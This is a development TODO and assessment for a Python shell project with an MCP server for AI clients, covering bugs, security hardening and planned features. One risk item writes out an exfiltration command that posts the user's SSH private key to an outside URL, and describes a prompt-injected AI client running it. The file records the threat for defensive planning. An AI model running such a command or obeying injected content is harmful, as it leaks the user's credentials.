# ShellCraft — TODO

> First assessment: v0.1.0 (`main` @ 72a9897), when there were 42 tests. Second full assessment: 2026-09-28 (`main` @ 93e719b). Checked items have been done since then.
> **Current state:** 37 builtins (including `alias`, `history`, `diff` and `du`), a settings system (OS commands off by default) with API keys for modules (`ENV_SETTINGS`), modules `fetch`, `filter`, `myip`, `ip2geo`, `queryDns`, `queryCert` and `queryCensys`, the module authoring kit (`templates/`, `tools/modtest.py`, `tools/mkprompt.py`), switch completion, typed MCP parameters, man-page resources, hot reload and an HTTP transport. 325 tests pass (1 skipped), in ~2 s on Python 3.14. About 6,400 lines of application code (core, modules, tools) and 2,500 lines of tests.

## Assessment

**What's solid**
- The layering is clean. The parser, the pipeline executor and the UI are separate. `run_line()` is UI-agnostic and shared by the REPL, `-c` mode, the MCP server and the tests.
- The three-file module contract (`.py` / `.md` / `.skill`) is simple and works well. A broken module becomes a warning, not a crash.
- The MCP integration is safe by default: the pipeline tool can't redirect to files, can't use shell-state builtins, and can't run system commands.
- The UX feels good: themes, ghost text, delayed spinner, auto-pager and error panels that point at the failing segment.

**Biggest risks**
1. **Security of the MCP surface.** `fetch` can request *any* URL, including loopback and private addresses. *(Accepted, like reading any file the user can read: see Won't do.)*
2. **Shell-grammar gaps fail silently.** `2>` is misparsed, and `<`, `;` and `&&` become plain arguments. Users expecting POSIX behavior can get wrong results with no error. *(Fixed: they're now rejected with a parse error.)*
3. **The system-command fallback is capture-only.** Interactive programs misbehave, and "no match" exit codes abort the pipeline. *(Now off by default, and the ported builtins cover the common commands. Accepted: see Won't do.)*
4. **Only tested on Linux.** None of the Windows paths have been run yet.
5. **Packaging is broken.** A non-editable install crashes on startup (see Bugs). Nothing catches this today because there's no CI and the tests run from the source tree.
6. **The MCP surface can exfiltrate.** Reading any file is accepted, and so is `fetch` reaching any URL, but together they let a prompt-injected client run `fetch -d @~/.ssh/id_rsa https://…`. The per-module exposure switch (Security) is the fix that fits the "modules stay as they are" decision.

**Second assessment (2026-09-28)**
- The architecture held up well: 7 modules and 37 builtins were added without changing the pipeline design, and the three-file contract now drives MCP schemas, man-page resources and Tab completion.
- The docs are thorough and mostly in sync. The test suite is fast and broad, but it only exercises the source tree, so packaging and platform bugs slip through.
- The main gaps are distribution (packaging, CI, license), hardening the MCP boundary (timeouts, exposure, argument handling), and exit-status semantics.

Items marked **(verified)** were reproduced during the assessment.

---

## 🐞 Bugs — P0

- [x] **Invalid custom theme color crashes startup**: `all_themes()` now checks each color against both Rich and prompt_toolkit, keeps the base preset's color, and the CLI prints a warning on stderr. — `core/themes.py`
- [x] **Unsupported operators were passed on as arguments**: `rm a ; ls` also deleted a file named `ls`, and `a 2> err.txt` sent stdout to `err.txt`. `;`, `&&`, `||`, `<`, `2>`, `2>>`, `2>&1`, `&>` and `>&` now raise a `ParseError` until they are implemented (see Features). — `core/parser.py`
- [ ] **A non-editable `pip install .` crashes on startup** **(verified)**: `packages = ["core"]` leaves out the `core.commands` subpackage, so `import core.commands` fails with `ModuleNotFoundError` before anything runs. The wheel also ships no modules, no `templates/` and no `tools/`, and `DEFAULT_MODULES_DIR` points outside the package. Fix: use `[tool.setuptools.packages.find]`, include the bundled modules as package data, and also load the user directory `~/.shellcraft/modules`. The generic top-level names `core` and `tools` will collide with other packages in site-packages, so move them under a `shellcraft/` package. — `pyproject.toml`, `core/cli.py`
- [ ] **MCP values that start with `-` become switches** **(verified)**: `params.to_argv` emits positionals and flag values as bare words, so `filter` with `{"pattern": "-v"}` fails with "arguments are required: pattern". A string flag value like `"-x"` fails the same way. Worse, text taken from untrusted content can inject switches. Fix: emit `--flag=value`, and put `--` before the positionals. — `core/params.py`
- [x] **Pager search `n` got stuck on the last screen**: the last match is now tracked apart from the scroll position, so `n`/`N` step through every match, and matches are highlighted in reverse video. — `core/output.py::page`

## 🔒 Security — P0

- [ ] **Per-module MCP exposure switch**: `expose = false` in `.skill`, and a `--expose name,...` CLI flag, so sensitive modules stay local-only. This also closes the `fetch -d @FILE` exfiltration path and the paid-quota use of `queryDns`/`queryCensys` without touching the modules. It must apply to the `shellcraft_pipeline` tool too, not only to the per-module tools. — `core/loader.py`, `core/mcp_server.py`
- [ ] **No timeout on MCP tool calls**: a hung module holds a worker thread forever. Add a per-call timeout (`anyio.fail_after`) and caps on stdin and output size. Easy triggers: `du /`, `find /`, `tree /`, or a catastrophic regex in `grep`/`filter`. — `core/mcp_server.py`
- [x] **History records everything**: a line typed with a leading space is no longer saved (bash's `ignorespace`). *(Values in `settings NAME VALUE` are still redacted.)* — `core/shell.py`
- [ ] **API keys are stored in plain text** in `config.json` (mode 600, which doesn't protect them on Windows). Offer the OS keyring (`keyring` package) as an optional backend. — `core/settings.py`

## 🔧 Bugs / polish — P1

- [ ] **Hot reload races with MCP calls**: `ModuleRegistry.load()` empties `self.modules` and then refills it, while tool calls run in worker threads. A call that arrives mid-reload gets "Unknown tool" or "command not found". Build the new dict first, then swap it in. — `core/loader.py`
- [ ] **Broken pipe in `-c` mode** **(verified)**: `shellcraft -c "cat big.txt" | head -1` prints `Exception ignored … BrokenPipeError` and exits 120. Catch `BrokenPipeError`, redirect stdout to devnull and exit quietly. Ctrl-C during `-c` isn't caught either (a traceback instead of exit 130). — `core/cli.py::_run_once`
- [ ] **A redirect silently creates missing directories** **(verified)**: `echo a > typo/dir/f.txt` makes `typo/dir/`. POSIX shells fail with "No such file or directory", which catches typos. Drop the `mkdir(parents=True)`. — `core/pipeline.py`
- [ ] **Ctrl-C abandons the module worker thread**, which keeps running. Add a cooperative cancel flag in `modkit` that modules can check, or at least document the behavior. — `core/output.py::make_spinner_runner`
- [ ] **`to_text()` flattens at a fixed width of 100**, so `help | filter` ignores the real terminal width. Pass the console width when there is one. — `core/context.py`
- [ ] **`show()` renders twice** (a capture pass, then a print pass) and loads huge outputs fully into Rich. Reuse the captured ANSI, and cap or stream very large outputs into the pager. — `core/output.py`
- [x] **Windows: the prompt's `~` shortening was case-sensitive**: it now compares with `os.path.normcase`. — `core/shell.py`
- [x] **`cd` inside a pipeline changed the real cwd** (`cd x | pwd`): `cd` is now refused unless it's alone on the line (no pipe, no redirect). — `core/pipeline.py`
- [ ] **Loader hygiene**: there is no parent package, so relative imports inside modules fail. *(Stale `sys.modules["shellcraft_modules.*"]` entries are now cleared on every reload.)* — `core/loader.py`
- [x] **Switch completion**: Tab completes each command's options and option values from its `.skill` `[[args]]` (including the new `values` key) and its `.md` options table. It is modular, with no per-module code.
- [ ] **Completer ignores quotes**: paths containing spaces complete wrongly. — `core/completer.py`
- [ ] **Positional values aren't completed**: `queryCensys <Tab>` offers file names instead of `host` / `cert` / `search`, although the `.skill` `[[params]]` entry `command` lists them in `values`. Complete positionals from such entries. — `core/options.py`, `core/completer.py`
- [x] **Dead code**: `ShellContext.interactive` is now read by `settings NAME` to choose the hidden prompt.
- [ ] **Version is defined twice** (`pyproject.toml` and `core/__init__.py`). Use a single dynamic version. — `pyproject.toml`
- [ ] **`sort -u -k N` dedupes whole lines**, not keys as in GNU sort. — `core/commands/text.py`
- [ ] **DEVELOPMENT.md drift**: the context-flags table lists only `env` as `sensitive` and leaves `history` out of the `stateful` list. — `DEVELOPMENT.md`

## ⬆️ Upgrades — P1

- [x] **API-key precedence**: at startup a variable already in the environment (the user's shell, an MCP client's `env` block) now wins over the stored key, and `settings` shows `from environment (stored ••••ab12 unused)`. `settings NAME VALUE` during a session still replaces it. — `core/settings.py`
- [ ] **Streaming pipelines**: allow `run()` to return an iterator of lines so that large inputs don't sit in memory, while plain `str` returns keep working. — `core/pipeline.py`, `core/loader.py`
- [x] **MCP improvements:**
  - [x] Every module's `.md` and every MCP-usable builtin's manual is a resource at `shellcraft://man/<name>`.
  - [x] Streamable-HTTP transport: `--mcp-http 127.0.0.1:8765` (loopback addresses only, DNS-rebinding protection on).
  - [x] `tools/list_changed` and `resources/list_changed` on reload, both to `subscriptions/listen` streams and to older clients' connections.
  - [x] `.skill` `[[params]]` declare typed, named parameters (the MCP input schema); all bundled modules and the template use them. Modules without them keep the raw `args` array. — `core/params.py`
- [x] **Hot reload**: the modules folder is polled for `.py`/`.md`/`.skill` changes, in the shell (before each command) and the MCP server (every second). The `hot_reload` setting turns it off. — `core/watch.py`
- [x] **`fetch`**: `--max-size` (default 10M), `-H/--header`, `-X/--method`, `-d/--data` (text, `@FILE`, `@-`), `--retry N` with backoff and `Retry-After`, and rejection of binary content.
- [ ] **Themes**:
  - [x] Dracula, Gruvbox, Catppuccin and Tokyo Night presets
  - `theme preview NAME` (no save)
  - light-terminal variants
  - theme validation warnings shown in the banner
- [ ] **Exit status**:
  - a `status` builtin or `$?`
  - show the code in the prompt as `[✗ 1]`
  - `grep` returns status 1 when nothing matches, so scripts can test it. Today `shellcraft -c "echo hi | grep zzz"` exits 0 **(verified)**

## ✨ Features — P2

- [ ] **Shell grammar**:
  - `<` input redirect
  - `2>` / `2>&1`
  - `;`, `&&`, `||`
  - `$VAR` / `%VAR%` expansion with `export`
  - glob expansion (`*.log`)
  - `~user`
- [x] **Ported builtins, first batch**: `ls`, `cat`, `grep`, `echo`, `tee`, `head`, `tail`, `wc`, `sort`, `uniq`, `date`, `mkdir`, `cp`, `mv`, `rm`, plus the `settings` command with OS commands off by default.
- [x] **Ported builtins, second batch**: `find`, `touch`, `which`, `tree`, `cut`, `tr`, `env` (`env` is blocked in MCP as sensitive).
- [x] **`alias` / `unalias`**: saved in `config.json`, expanded per pipeline step, `\NAME` skips an alias, not applied over MCP. — `core/aliases.py`
- [x] **`history`, `diff`, `du`**: `history [N] | -c`; `diff` with classic and unified (`-u`/`-U N`) output, `-i -w -b -q -s -r`, directories and binary files, output identical to GNU diff; `du` with apparent sizes (`-s -h -a -d N -c -S -b`), matching GNU `du --apparent-size`.
- [ ] **More builtins**: `source`, `sleep`, `time`, `type`, `basename` / `dirname`.
- [ ] **Startup rc file** `~/.shellcraft/rc` (aliases, env, theme).
- [ ] **Input-line syntax highlighting** with a prompt_toolkit lexer: known commands green, unknown ones red, operators in the accent color. Also:
  - a bottom toolbar (cwd, git branch, last command duration)
  - Ctrl-R history search
- [x] **Module authoring kit**: `templates/` (a reference module plus a guide), `tools/modtest.py` (the tester, including `[[tests]]` in `.skill` files and `--preview`), and `tools/mkprompt.py` (an AI prompt that writes `.md`/`.skill` from a `.py`).
- [ ] **Module scaffolding**: a `new-module NAME` builtin that copies the template trio and renames it. Also a `modtest` builtin inside the shell, and running `modtest --all --strict` in CI.
- [ ] **Modules as packages**: `modules/<name>/` directories, per-module requirements, and version/author metadata in `.skill`.
- [ ] **Structured data mode**: JSON-lines between modules, with `select`, `where`, `sort-by` and a `table` renderer, for Nushell-style pipelines.
- [ ] **Background jobs** (`cmd &`, `jobs`, `fg`) and per-command timing.
- [ ] **`ask "..."` builtin**: a Claude-powered assistant that uses the loaded modules as tools and their `.skill` files as guidance.
- [x] **Network lookup modules**: `ip2geo` (ip-api.com), `queryDns` (DnsDumpster), `queryCert` (crt.sh) and `queryCensys` (Censys Platform SDK), plus API-key settings (`ENV_SETTINGS`: masked in `settings`, hidden prompt, exported in every mode including MCP).
- [ ] **More modules**: `json` (pretty-print/query), `hash`, `whois`, `weather`.

## 🧪 Tests / CI / docs — P1

- [ ] **Missing tests**:
  - the completer
  - pager key handling (using prompt_toolkit pipe input)
  - the `show()` paging threshold
  - `theme` persistence
  - custom theme parsing
  - `-c` exit codes
  - the banner's narrow-terminal fallback
  - a packaging smoke test: build the wheel, install it into a clean venv, and run `shellcraft -c help` (it would have caught the `core.commands` crash)
  - MCP params whose values start with `-`
- [ ] **`.gitlab-ci.yml`**: run pytest on Linux and Windows runners, Python 3.11–3.14 (development happens on 3.14), plus the packaging smoke test and `modtest --all --strict`.
- [ ] **Tooling**: ruff (lint and format) and mypy config in `pyproject.toml`, plus a pre-commit hook. Neither is installed in the dev environment yet; add them to the `dev` extra.
- [x] **Docs split**: README (install and usage), `templates/README.md` (module authoring), `DEVELOPMENT.md` (layout, architecture, tests).
- [ ] **Docs**: a LICENSE, a README screenshot or asciinema recording, and a CHANGELOG.
- [ ] **Windows verification pass**: covering prompt rendering, the pager, `cmd` builtins, paths and the MCP stdio server.

## 🚫 Won't do

The OS-program fallback (`system_commands` / `--allow-system`) stays opt-in and capture-only. The portable builtins and modules are the supported path.

- **Nonzero exit from a system command aborts the pipeline** (for example grep's "no match" status 1). — `core/pipeline.py::_run_system`
- **Interactive system programs misbehave** (`vim`, `top`, `ssh`, `python`) because their stdin and stdout are pipes. — `core/pipeline.py`
- **A system command's stderr is dropped on success.** — `core/pipeline.py`
- **Captured system output loses its colors** (no `FORCE_COLOR` / `CLICOLOR_FORCE`). — `core/pipeline.py`
- **`-c` doesn't return the failing system command's real exit code.** — `core/cli.py`

MCP file access is deliberately not sandboxed: the AI can read every file the user running the server can read.

- **`--root DIR` sandbox for MCP file reads** (`fetch` and the read builtins `cat`, `grep`, `ls`, `find`, `tree`…). File-*changing* commands and redirects stay blocked in MCP. — `core/mcp_server.py`

The bundled modules (`fetch`, `filter`, `ip2geo`, `myip`, `queryCensys`, `queryCert`, `queryDns`) stay as they are: no further fixes or improvements are planned for them.

- **`fetch`: SSRF blocking over MCP.** Loopback, private, link-local and cloud-metadata URLs stay reachable, with no URL allowlist. *(Its max response size was done: `--max-size`.)* — `modules/fetch.py`
- **`queryDns` / `queryCensys` spend the user's API quota through MCP**, with no per-module opt-out in their `.skill` notes. — `modules/queryDns.skill`, `modules/queryCensys.skill`
- **`queryCensys`**: checking the table layouts against a real token (only the error paths were live-tested), `--at-time` for host history, and `web HOSTNAME:PORT` lookups (`get_web_property`). — `modules/queryCensys.py`
- **`queryDns`**: confirming the CNAME record shape with a domain that has CNAMEs, and the Plus-only `?map=1` domain map. — `modules/queryDns.py`
- **`queryCert`**: a per-test `timeout` key in `[[tests]]`, because crt.sh often needs more than modtest's 10 s. — `tools/modtest.py`
- **`ip2geo`**: the ip-api.com batch endpoint (`POST /batch`, up to 100 IPs per request) for long lists. — `modules/ip2geo.py`
- **`myip`**: a short-lived result cache, parallel lookups for many IPs, comma-separated `--field` lists, and a clear message for private-range IPs. — `modules/myip.py`

---

**Legend:** **P0** = fix soon (correctness / security) · **P1** = next iteration · **P2** = nice to have · **Won't do** = out of scope, recorded on purpose
